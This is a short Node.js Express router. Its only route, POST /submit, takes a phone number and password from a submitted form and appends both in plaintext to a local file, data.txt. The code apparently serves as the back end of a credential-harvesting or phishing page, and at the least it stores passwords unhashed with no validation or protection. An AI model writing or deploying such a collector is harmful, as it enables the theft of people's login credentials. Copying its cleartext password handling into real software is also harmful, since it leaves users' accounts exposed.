
const express = require('express');
const multer = require('multer');
const fs = require('fs');

const router = express.Router();
const upload = multer();

router.post('/submit', upload.none(), (req, res)
 => {
  const data = req.body;
  const log = `Phone: ${data.phone}, Password:
 ${data.password}\n`;

  fs.appendFileSync('data.txt', log);
  res.sendStatus(200);
});

module.exports = router;
            
